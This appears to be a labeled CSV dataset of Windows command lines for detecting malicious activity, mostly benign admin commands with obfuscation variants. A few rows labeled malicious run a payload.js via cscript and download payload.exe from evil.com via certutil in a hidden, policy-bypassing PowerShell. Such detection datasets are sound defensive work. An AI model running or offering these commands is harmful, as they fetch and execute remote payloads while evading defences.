command,label,technique,source,obfuscation_type,privilege_level,command_id,dataset_version,creation_date
CsCrIpT //NoLoGo //e:jScRiPt c:\TeMp\pAyLoAd.jS,malicious,T1059.001,volt_typhoon_variant,case_variation,user,24,2.0_alternative_syntax,2025-11-24
cmd.exe /c dir %WINDIR%\System32,benign,administrative,admin_variant,"shortened,environment_vars,case_variation",high,88,2.0_alternative_syntax,2025-11-24
echo Checking system... & dism	/online	/cleanup-image	/restorehealth,benign,administrative,admin_variant,whitespace,high,90,2.0_alternative_syntax,2025-11-24
tasklist	/svc,benign,administrative,admin_variant,whitespace,user,75,2.0_alternative_syntax,2025-11-24
echo Checking system... & dir  C:\Windows\System32,benign,administrative,admin_variant,"whitespace,case_variation",high,87,2.0_alternative_syntax,2025-11-24
"powershell.exe -c ""net	share""",benign,administrative,admin_variant,whitespace,user,83,2.0_alternative_syntax,2025-11-24
cscript  //nologo  //e:jscript  C:\temp\payload.js,malicious,T1059.001,volt_typhoon_variant,"whitespace,case_variation",user,21,2.0_alternative_syntax,2025-11-24
cmd.exe /c ping google.com,benign,administrative,admin_variant,none,user,61,2.0_alternative_syntax,2025-11-24
"powershell.exe -c ""tasklist /svc""",benign,administrative,admin_variant,none,user,72,2.0_alternative_syntax,2025-11-24
"powershell.exe -windowstyle hidden -exec bypass -c ""certutil  -urlcache  -split  -f  http://evil.com/payload.exe""",malicious,T1105,volt_typhoon_variant,whitespace,medium,15,2.0_alternative_syntax,2025-11-24
echo Checking system... & dism -online -cleanup-image -restorehealth,benign,administrative,admin_variant,syntax_variation,high,93,2.0_alternative_syntax,2025-11-24
netstat  -an,benign,administrative,admin_variant,whitespace,user,52,2.0_alternative_syntax,2025-11-24
